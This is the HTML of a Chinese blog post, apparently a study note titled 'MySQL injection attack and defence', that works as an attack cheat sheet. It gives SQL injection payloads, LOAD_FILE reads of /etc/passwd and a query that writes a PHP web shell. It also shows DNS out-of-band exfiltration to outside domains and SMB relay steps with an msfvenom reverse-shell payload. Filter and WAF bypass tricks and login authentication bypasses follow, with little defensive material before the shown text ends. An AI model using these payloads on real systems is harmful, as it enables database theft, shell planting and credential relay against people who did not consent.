@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ttoc.xin","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"1NWCFV229B","apiKey":"89f81f113af1e49e4b5061eb680ea44d","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="MySQL 注入攻击与防御MySQL 注入攻击与防御">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL 注入攻击与防御">
+<meta property="og:url" content="https://ttoc.xin/MySQL%20%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/index.html">
+<meta property="og:site_name" content="Ttoc&#39;s blog">
+<meta property="og:description" content="MySQL 注入攻击与防御MySQL 注入攻击与防御">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-13T06:15:01.492Z">
+<meta property="article:modified_time" content="2025-02-04T11:23:22.107Z">
+<meta property="article:author" content="Ttoc">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://ttoc.xin/MySQL%20%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MySQL 注入攻击与防御 | Ttoc's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ttoc's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/MySQL%20%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ttoc">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ttoc's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MySQL 注入攻击与防御
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-13 14:15:01" itemprop="dateCreated datePublished" datetime="2025-01-13T14:15:01+08:00">2025-01-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-04 19:23:22" itemprop="dateModified" datetime="2025-02-04T19:23:22+08:00">2025-02-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">网络安全学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="MySQL-注入攻击与防御"><a href="#MySQL-注入攻击与防御" class="headerlink" title="MySQL 注入攻击与防御"></a>MySQL 注入攻击与防御</h1><p><code>MySQL 注入攻击与防御</code></p>
+<span id="more"></span>
+
+
+
+<p><strong>注入常用函数与字符</strong></p>
+<p>下面几点是注入中经常会用到的语句</p>
+<p>控制语句操作(select, case, if(), …)</p>
+<p>比较操作(&#x3D;, like, mod(), …)</p>
+<p>字符串的猜解操作(mid(), left(), rpad(), …)</p>
+<p>字符串生成操作(0x61, hex(), conv()(使用conv([10-36],10,36)可以实现所有字符的表示))</p>
+<p><strong>测试注入</strong></p>
+<p>可以用以下语句对一个可能的注入点进行测试</p>
+<p>![image-20250113141629565](MySQL 注入攻击与防御&#x2F;image-20250113141629565.png)</p>
+<p><strong>注释符</strong></p>
+<p>以下是Mysql中可以用到的注释符：</p>
+<p>![image-20250113141653328](MySQL 注入攻击与防御&#x2F;image-20250113141653328.png)</p>
+<p>Examples:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- -&#x27; AND password = &#x27;&#x27;;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>`<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>版本&amp;主机名&amp;用户&amp;库名</strong></p>
+<p>![image-20250113141704543](MySQL 注入攻击与防御&#x2F;image-20250113141704543.png)</p>
+<p><strong>表和字段</strong></p>
+<p><strong>确定字段数</strong></p>
+<p><strong>ORDER BY</strong></p>
+<p>ORDER BY用于判断表中的字段个数</p>
+<p>![image-20250113141715724](MySQL 注入攻击与防御&#x2F;image-20250113141715724.png)</p>
+<p><strong>SELECT … INTO</strong></p>
+<p>关于SELECT … INTO 的解释可以看这一篇文章<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/sql/sql_select_into.asp">SELECT … INTO解释</a></p>
+<p>![image-20250113141735860](MySQL 注入攻击与防御&#x2F;image-20250113141735860.png)</p>
+<p>当出现LIMIT时可以用以下语句：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM Users <span class="built_in">limit</span> 1,&#123;INJECTION POINT&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>![image-20250113141730952](MySQL 注入攻击与防御&#x2F;image-20250113141730952.png)</p>
+<p><strong>判断已知表名的字段数</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">AND</span> (SELECT * FROM SOME_EXISTING_TABLE) = <span class="number">1</span></span><br><span class="line">SELECT passwd FROM Users WHERE id = &#123;INJECTION POINT&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>![1736749063727](MySQL 注入攻击与防御&#x2F;1736749063727-1736749178899-9.png)</p>
+<p><strong>查表名</strong></p>
+<p>以下提过几种方式对库中表进行查询</p>
+<p>![1736749068930](MySQL 注入攻击与防御&#x2F;1736749068930.png)</p>
+<p><strong>查列名</strong></p>
+<p>以下提过几种方式对表中列进行查询</p>
+<p>![image-20250113141840771](MySQL 注入攻击与防御&#x2F;image-20250113141840771.png)</p>
+<p><strong>字符串连接</strong></p>
+<p>下面的几条语句都可以用以连接字符</p>
+<p>![image-20250113141831068](MySQL 注入攻击与防御&#x2F;image-20250113141831068.png)</p>
+<p><strong>条件语句&amp;时间函数</strong></p>
+<p>![image-20250113142105661](MySQL 注入攻击与防御&#x2F;image-20250113142105661.png)</p>
+<p>其中BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</p>
+<p><strong>文件操作</strong></p>
+<p><strong>文件操作权限</strong></p>
+<p>在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE()</p>
+<p>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</p>
+<p>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</p>
+<p>![image-20250113142144464](MySQL 注入攻击与防御&#x2F;image-20250113142144464.png)</p>
+<p>也可使用如下语句查询</p>
+<p>![image-20250113142155695](MySQL 注入攻击与防御&#x2F;image-20250113142155695.png)</p>
+<p><strong>读文件</strong></p>
+<p>读文件函数LOAD_FILE()</p>
+<p>Examples:</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="built_in">LOAD_FILE</span>(&#x27;/etc/passwd&#x27;);</span><br><span class="line">SELECT <span class="built_in">LOAD_FILE</span>(<span class="number">0</span>x2F6574632F706173737764);</span><br></pre></td></tr></table></figure>
+
+<p>注意点： </p>
+<ol>
+<li>LOAD_FILE的默认目录@@datadir </li>
+<li>文件必须是当前用户可读 </li>
+<li>读文件最大的为1047552个byte, @@max_allowed_packet可以查看文件读取最大值</li>
+</ol>
+<p><strong>写文件</strong></p>
+<p>INTO OUTFILE&#x2F;DUMPFILE</p>
+<p>经典写文件例子：</p>
+<p>To write a PHP shell:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;? system($_GET[&#x27;</span>c<span class="string">&#x27;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这两个函数都可以写文件，但是有很大的差别 </p>
+<p>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 </p>
+<p>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 </p>
+<p>当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的 </p>
+<p>网上有很多文章介绍，比如<a target="_blank" rel="noopener" href="http://www.cnblogs.com/milantgh/p/5444398.html">这篇</a></p>
+<p>注意点： </p>
+<ol>
+<li>INTO OUTFILE不会覆盖文件 </li>
+<li>INTO OUTFILE必须是查询语句的最后一句 </li>
+<li>路径名是不能编码的，必须使用单引号</li>
+</ol>
+<p><strong>带外通道</strong></p>
+<p>关于带外通道的注入前段时间国外的大佬已经总结过了，我基本复现了一下，博客有文章，这里简单提一下</p>
+<p><strong>什么是带外通道注入？</strong></p>
+<p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.</p>
+<p><strong>条件限制</strong></p>
+<p>首先不用多说,这些函数是需要绝对路径的</p>
+<p>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</p>
+<p>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</p>
+<p><strong>DNS注入</strong></p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> load_file(<span class="built_in">concat</span>(<span class="string">&#x27;\\&#x27;</span>,version(),<span class="string">&#x27;.rootclay.club\clay.txt&#x27;</span>));</span><br><span class="line"><span class="built_in">select</span> load_file(<span class="built_in">concat</span>(<span class="number">0x5c5c5c5c</span>,version(),<span class="number">0x2e6861636b65722e736974655c5c612e747874</span>));</span><br></pre></td></tr></table></figure>
+
+<p>上面的语句执行的结果我们可以通过wireshark抓包看一下，过滤一下DNS协议即可清晰看到数据出去的样子，如下图</p>
+<p>![image-20250113142207494](MySQL 注入攻击与防御&#x2F;image-20250113142207494.png)</p>
+<p>进行DNS注入需要域名解析，自己有的话最好，但是没有的朋友也没事，这里推荐一个网站CEYE可以查看数据</p>
+<p><strong>SMB Relay 注入攻击</strong></p>
+<p><strong>What is SMB relay</strong></p>
+<p>这里简单的描述一下SMB relay这个过程</p>
+<p>假设有主机B与A </p>
+<p>(1) A向B发起连接请求 </p>
+<p>(2) B向A发送挑战(一组随机数据，8字节) </p>
+<p>(3) A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B </p>
+<p>(4) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对前面发往A的挑战进 </p>
+<p>行标准DES加密 </p>
+<p>(5) 如果(4)中计算结果与A送过来的响应匹配，A被允许访问B </p>
+<p>现在假设一个攻击者C卷入其中 </p>
+<p>(1) C向B发起连接请求 </p>
+<p>(2) B向C发送挑战D(一组随机数据) </p>
+<p>(3) C等待A向B发起连接请求 </p>
+<p>(4) 当A向B发起连接请求时，C伪造成B向A发送挑战D </p>
+<p>(5) A用源自明文口令的DESKEY对挑战D进行标准DES加密得到响应E，并发往B </p>
+<p>(6) C截获到响应E，将它做为针对(2)中挑战D的响应发往B，并声称自己是A </p>
+<p>(7) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对挑战D进行标准DES </p>
+<p>加密 </p>
+<p>(8) 如果(7)中计算结果与C送过来的响应匹配，C被允许以A的身份访问B。</p>
+<p><strong>攻击流程</strong></p>
+<p>![image-20250113142217112](MySQL 注入攻击与防御&#x2F;image-20250113142217112.png)</p>
+<p>关于SMB relay攻击窃取NTML与shell请看这篇文章<a target="_blank" rel="noopener" href="http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python">SMB Relay Demystified and NTLMv2 Pwnage with Python</a></p>
+<p>整理了一下实际操作的步骤如下: </p>
+<ol>
+<li>首先生成一个反向shell:</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=攻击机监听端口 -f exe &gt; reverse_shell.exe</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>运行<a target="_blank" rel="noopener" href="https://github.com/CoreSecurity/impacket">smbrelayx</a>，指定被攻击者和生成的反向shell，等待连接。</li>
+</ol>
+<p>smbrelayx.py -h 被攻击者ip -e 反向shell文件位置 </p>
+<ol start="3">
+<li>使用模块multi&#x2F;handler。侦听攻击机ip,攻击机监听端口 </li>
+<li>在MySQL Server上运行如下的代码，则会产生shell。相当于访问攻击机的smb服务,但实际上是窃取了mysql_server的身份</li>
+</ol>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">load_file</span>(<span class="params"><span class="string">&#x27;\攻击机ipaa&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>绕过技巧</strong></p>
+<p><strong>绕过单引号</strong></p>
+<p>![image-20250113142226374](MySQL 注入攻击与防御&#x2F;image-20250113142226374.png)</p>
+<p><strong>大小写绕过</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLecT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>替换绕过</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1+UNunionION+SEselectLECT+1,2,3--</span><br></pre></td></tr></table></figure>
+
+<p><strong>注释绕过</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1+un/**/ion+se/**/lect+1,2,3--</span><br></pre></td></tr></table></figure>
+
+<p><strong>特殊嵌入绕过</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="keyword">SeLecT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>宽字节注入</strong></p>
+<p>SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
+<p><strong>MySQL版本号字符</strong></p>
+<p>Examples:</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span>UNION SELECT /<span class="emphasis">*!50000 5,null;%00*</span>//<span class="emphasis">*!40000 4,null-- ,*</span>//<span class="emphasis">*!30000 3,null-- x*</span>/0,null--+<span class="language-xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span>SELECT 1/<span class="emphasis">*!41320UNION/*</span>!/<span class="emphasis">*!/*</span>!00000SELECT/<span class="emphasis">*!/*</span>!USER/<span class="emphasis">*!(/*</span>!/<span class="emphasis">*!/*</span>!<span class="emphasis">*/);<span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+
+<p>这样的查询语句是可以执行的，我理解为类似Python中第一行注释指定解析器一样#!&#x2F;bin&#x2F;sh</p>
+<p>对于小于或等于版本号的语句就会执行</p>
+<p>例如目前的Mysql版本为5.7.17那么&#x2F;!50717&#x2F;及其以下的语句即可执行</p>
+<p><strong>字符编码绕过</strong></p>
+<p>前段时间看到ph师傅的博客是讨论mysql字符编码的文章，大概意思如下，原文在<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">这里 </a></p>
+<p>当出现有以下代码时，指设置了字符编码为utf-8，但并不是全部为utf-8，而在具体的转换过程中会出现意外的情况，具体可以看ph师傅的文章</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在sql查询中</p>
+<p>test.php?username&#x3D;admin%e4中的%e4会被admin忽略掉而绕过了一些逻辑，还有一些类似于$e4这样的字符如%c2等</p>
+<p><strong>绕空格</strong></p>
+<p><strong>特殊字符绕过空格</strong></p>
+<p>![image-20250113142237156](MySQL 注入攻击与防御&#x2F;image-20250113142237156.png)</p>
+<p>Example:</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27;%0AUNION%0CSELECT%A0NULL%20%23</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>括号绕过空格</strong></p>
+<p>![image-20250113142244887](MySQL 注入攻击与防御&#x2F;image-20250113142244887.png)</p>
+<p>Example:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(<span class="keyword">column</span>)<span class="keyword">FROM</span>(<span class="keyword">table</span>))</span><br></pre></td></tr></table></figure>
+
+<p><strong>and&#x2F;or后插入字符绕过空格</strong></p>
+<p>任意混合+ – ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> `Host`<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">and</span><span class="operator">-</span><span class="operator">+</span><span class="operator">+</span><span class="number">-1</span><span class="operator">=</span><span class="number">1</span>;需要偶数个<span class="comment">--</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> `Host`<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">and</span><span class="operator">!</span><span class="operator">!</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="operator">!</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>;需要奇数个！</span><br></pre></td></tr></table></figure>
+
+<p>其实一下的字符都可以测试</p>
+<p>![image-20250113142254149](MySQL 注入攻击与防御&#x2F;image-20250113142254149.png)</p>
+<p><strong>注释符&amp;引号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> `Host`<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> `Host`<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">and</span>&quot;1=1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>编码绕过</strong></p>
+<p>![image-20250113142311014](MySQL 注入攻击与防御&#x2F;image-20250113142311014.png)</p>
+<p><strong>关键字绕过</strong></p>
+<p>测试用例information_schema.tables</p>
+<p>![image-20250113142326984](MySQL 注入攻击与防御&#x2F;image-20250113142326984.png)</p>
+<p><strong>认证绕过</strong></p>
+<p>绕过语句：’&#x3D;’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> name<span class="operator">=</span>&quot;=&quot;</span><br><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> flase<span class="operator">=</span>&quot;</span><br><span class="line">select data from users where 0=0</span><br></pre></td></tr></table></figure>
+
+<p>绕过语句：’-‘</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> name=<span class="string">&#x27;&#x27;</span>-<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> name=<span class="number">0</span><span class="number">-0</span></span><br><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> <span class="number">0</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>比如登录的时候需要输入email和passwd，可以这样输入</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">email</span>=<span class="string">&#x27;&#x27;</span>&amp;password=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>类型转换</p>
